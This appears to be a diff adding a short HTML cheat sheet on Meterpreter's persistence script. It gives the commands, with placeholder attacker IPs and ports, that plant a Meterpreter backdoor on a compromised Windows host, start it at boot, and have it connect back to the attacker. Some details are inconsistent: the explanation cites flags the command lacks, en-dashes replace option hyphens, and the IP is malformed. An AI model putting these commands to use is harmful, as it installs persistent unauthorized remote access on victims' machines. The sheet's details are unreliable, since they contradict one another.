@@ -1,0 +1,20 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Persistence Mode</title>
+</head><body><br/>
+<span style="font-size: 12pt">meterpreter &gt; run persistence -h<br/>
+meterpreter &gt;run persistence -A -L c:\\ &nbsp;-X 30 –p 443 –r 192.168.x.x &nbsp;(need high Priv On the system)<br/>
+<br/>
+run persistence -U -i 5 -p 4443 -r 192.168.x.x <br/>
+<br/>
+<br/>
+</span><span style="font-size: 12pt">This command then will run the persistence script that will start a matching handler (-A), place the Meterpreter at c:\\ on the target system (-L c:\\), starts the listener when the system boots (-x), checks every 30 seconds for a connection (-i 30), connects on port 443 (-p 443), and connects to the local system (ours) on IP address 192.168.1.X.X</span><br/>
+<br/>
+<br/>
+<br/>
+<br/>
+<img src="image.png" /><br/>
+<br/>
+</body></html>
